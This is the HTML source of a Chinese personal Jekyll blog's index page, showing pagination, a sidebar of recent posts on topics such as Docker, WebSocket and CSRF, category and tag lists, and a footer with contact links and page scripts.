                    <a  href="/2020/07/07/Session%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86-%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0%E4%B8%8E%E9%98%B2%E8%8C%83_Web%E5%BC%80%E5%8F%91/"><i class="fa fa-newspaper-o"></i>Read All</a>
                </div>
                <hr>
              </li>
            
        </ul>



        <!-- Pagination links -->
        <div class="pagination">
          
            <a href="/index.html" class="previous"><i class="fa fa-angle-double-left"></i></a>
            <a href="/" class="previous"><i class="fa fa-angle-left"></i></a>
          
          <span class="page_number ">2/8</span>
          
            <a href="/page3" class="next"><i class="fa fa-angle-right"></i></a>
            <a href="/page8" class="next"><i class="fa fa-angle-double-right"></i></a>
          
        </div>
    </div>
    <!-- <button class="anchor"><i class="fa fa-anchor"></i></button> -->
    <div class="right">
        <div class="wrap">
            <div class="side">
                <div>
                    <i class="fa fa-pencil-square-o" aria-hidden="true"></i>
                    Recent Posts
                </div>
                <ul class="content-ul" recent>
                    
                        <li><a href="/2020/08/18/Fiddler%E6%8A%93%E5%8C%85%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B-%E8%BF%87%E6%BB%A4-%E8%B5%B5%E5%BD%A6%E5%86%9B-%E5%8D%9A%E5%AE%A2%E5%9B%AD/">Fiddler抓包使用教程-过滤-赵彦军-博客园</a></li>
                    
                        <li><a href="/2020/08/14/Docker%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%95%99%E7%A8%8B-%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/">Docker微服务教程-阮一峰的网络日志</a></li>
                    
                        <li><a href="/2020/08/14/Docker%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B-%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/">Docker入门教程-阮一峰的网络日志</a></li>
                    
                        <li><a href="/2020/08/12/%E7%8E%8B%E8%B7%AF-%E5%87%BA%E5%AE%B6%E4%BA%BA%E6%80%8E%E4%B9%88%E8%A7%A3%E5%86%B3%E6%80%A7%E6%AC%B2-_%E7%99%BE%E7%A7%91TA%E8%AF%B4/">王路：出家人怎么解决性欲？_百科TA说</a></li>
                    
                        <li><a href="/2020/07/29/%E5%A6%82%E4%BD%95%E8%B0%83%E6%95%B4%E8%87%AA%E8%A1%8C%E8%BD%A6%E8%BD%A6%E5%9C%88-%E7%BE%8E%E9%AA%91%E7%BD%91_Biketo.com/">如何调整自行车车圈-美骑网_Biketo.com</a></li>
                    
                        <li><a href="/2020/07/20/%E4%B8%AD%E5%9B%BD%E7%A4%BE%E4%BA%A4%E4%BA%8C%E5%8D%81%E5%B9%B4-%E8%99%8E%E5%97%85%E7%BD%91/">中国社交二十年-虎嗅网</a></li>
                    
                        <li><a href="/2020/07/08/%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8-%E4%BA%8C-%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/">互联网协议入门（二）-阮一峰的网络日志</a></li>
                    
                        <li><a href="/2020/07/08/%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8-%E4%B8%80-%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/">互联网协议入门（一）-阮一峰的网络日志</a></li>
                    
                        <li><a href="/2020/07/08/WebSocket%E6%95%99%E7%A8%8B-%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/">WebSocket教程-阮一峰的网络日志</a></li>
                    
                        <li><a href="/2020/07/07/%E6%B5%85%E8%B0%88CSRF%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-hyddd-%E5%8D%9A%E5%AE%A2%E5%9B%AD/">浅谈CSRF攻击方式-hyddd-博客园</a></li>
                    
                </ul>
            </div>

            <!-- Content -->
            <div class="side ">
                <div>
                    <i class="fa fa-th-list"></i>
                    Categories
                </div>
                <ul class="content-ul" cate>
                    
                    <li>
                        <a href="/category/#印象笔记导入" class="categories-list-item" cate="印象笔记导入">
                            <span class="name">
                                印象笔记导入
                            </span>
                            <span class="badge">30</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#搜索技巧" class="categories-list-item" cate="搜索技巧">
                            <span class="name">
                                搜索技巧
                            </span>
                            <span class="badge">2</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#语言" class="categories-list-item" cate="语言">
                            <span class="name">
                                语言
                            </span>
                            <span class="badge">3</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#环境" class="categories-list-item" cate="环境">
                            <span class="name">
                                环境
                            </span>
                            <span class="badge">2</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#code" class="categories-list-item" cate="code">
                            <span class="name">
                                code
                            </span>
                            <span class="badge">1</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#问题" class="categories-list-item" cate="问题">
                            <span class="name">
                                问题
                            </span>
                            <span class="badge">1</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#Exception" class="categories-list-item" cate="Exception">
                            <span class="name">
                                Exception
                            </span>
                            <span class="badge">1</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#其他" class="categories-list-item" cate="其他">
                            <span class="name">
                                其他
                            </span>
                            <span class="badge">2</span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="/category/#工具" class="categories-list-item" cate="工具">
                            <span class="name">
                                工具
                            </span>
                            <span class="badge">4</span>
                        </a>
                    </li>
                    
                </ul>
            </div>
            <!-- 其他div框放到这里 -->
            <div class="side">
                <div>
                    <i class="fa fa-tags"></i>
                    Tags
                </div>
                <div class="tags-cloud">
                    
                    
                    
                    

                    

                    
                      
                      
                      
                      
                      
                      <a href="/tag/#tips" style="font-size: 18pt; color: #000;">tips</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#github" style="font-size: 11pt; color: #777;">github</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#搜索技巧" style="font-size: 12.5pt; color: #555;">搜索技巧</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#Liquid" style="font-size: 9pt; color: #999;">Liquid</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#jekyll" style="font-size: 12.5pt; color: #555;">jekyll</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#sql" style="font-size: 9pt; color: #999;">sql</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#Ubuntu" style="font-size: 9pt; color: #999;">Ubuntu</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#环境" style="font-size: 11pt; color: #777;">环境</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#win10" style="font-size: 9pt; color: #999;">win10</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#ssh" style="font-size: 9pt; color: #999;">ssh</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#命令" style="font-size: 11pt; color: #777;">命令</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#SSH" style="font-size: 9pt; color: #999;">SSH</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#Exception" style="font-size: 9pt; color: #999;">Exception</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#git" style="font-size: 12.5pt; color: #555;">git</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#代理" style="font-size: 9pt; color: #999;">代理</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#npm" style="font-size: 9pt; color: #999;">npm</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#装系统" style="font-size: 9pt; color: #999;">装系统</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#anki" style="font-size: 9pt; color: #999;">anki</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#工具" style="font-size: 11pt; color: #777;">工具</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#效率" style="font-size: 9pt; color: #999;">效率</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#流程图" style="font-size: 9pt; color: #999;">流程图</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#百度脑图" style="font-size: 9pt; color: #999;">百度脑图</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#stackoverflow" style="font-size: 9pt; color: #999;">stackoverflow</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#autohotkey" style="font-size: 9pt; color: #999;">autohotkey</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#websocket" style="font-size: 9pt; color: #999;">websocket</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#docket" style="font-size: 9pt; color: #999;">docket</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#docker" style="font-size: 9pt; color: #999;">docker</a>
                    
                      
                      
                      
                      
                      
                      <a href="/tag/#fiddler" style="font-size: 9pt; color: #999;">fiddler</a>
                    
                </div>
            </div>

            <!-- <div class="side">
                <div>
                    <i class="fa fa-external-link"></i>
                    Links
                </div>
                <ul  class="content-ul">

                </ul>
            </div> -->
        </div>
    </div>
</div>
<!-- <script src="/assets/js/scroll.min.js " charset="utf-8"></script> -->
<!-- <script src="/assets/js/pageContent.js " charset="utf-8"></script> -->


  <footer class="site-footer">


    <div class="wrapper">

        <p class="description">
            
        </p>
        <p class="contact">
            Contact me at: 
            <a href="https://github.com/tldsn" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
            <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=742720531@qq.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>  
            <a href="http://weibo.com/5578237033" title="Weibo"><i class="fa fa-weibo" aria-hidden="true"></i></a>  
            <a href="https://www.zhihu.com/people/yao-yu-jie-90" title="Zhihu"><i class="iconfont blog-zhihu"></i></a>  
            <a href="https://www.douban.com/people/122400251" title="Douban"><i class="iconfont blog-douban"></i></a>  
            <a href="https://music.163.com/#/user/home?id=263386850" title="Cloudmusic"><i class="iconfont blog-yinle"></i></a>  
             
               
            
        </p>
        <p class="busuanzi">
            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
        </p>
        <p class="power">
            <span>
                Site powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://pages.github.com/">Github Pages</a>.
            </span>
            <span>
                Theme designed by <a href="https://github.com/Gaohaoyang">HyG</a>.
            </span>
        </p>
    </div>
</footer>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  <div class="back-to-top">
    <a href="#top" data-scroll>
        <i class="fa fa-arrow-up" aria-hidden="true"></i>
    </a>
</div>

  <div id="music"></div>

  <!-- 加载 cplayer 脚本 -->
  <!-- <script src="https://cdn.jsdelivr.net/npm/cplayer/dist/cplayer.min.js"></script>
  <script>
    let player = new cplayer({
      element: document.getElementById('music'),
      playlist: [
      ]
    })

    cplayer.prototype.add163 = function add163(id) {
      if (!id) throw new Error("Unable Property.");
      return fetch("https://music.huaji8.top/?id=" + id).then(function (res) { return res.json() }).then(function (data) {
        let obj = {
          name: data.info.songs[0].name,
          artist: data.info.songs[0].ar.map(function (ar) { return ar.name }).join(','),
          poster: data.pic.url,
          lyric: data.lyric.lyric,
          sublyric: data.lyric.tlyric,
          src: data.url.url,
          album: data.info.songs[0].al.name
        }
        this.add(obj);
        return obj;
      }.bind(this))
    }
    player.add163(263386850)
  </script> -->
  <script src=" /assets/js/main.js " charset="utf-8"></script>
  <script src=" /assets/js/smooth-scroll.min.js " charset="utf-8"></script>
  <script type="text/javascript">
    smoothScroll.init({
      speed: 500, // Integer. How fast to complete the scroll in milliseconds
      easing: 'easeInOutCubic', // Easing pattern to use
      offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
    });
  </script>
  <!-- <script src=" /assets/js/scroll.min.js " charset="utf-8"></script> -->
</body>

</html>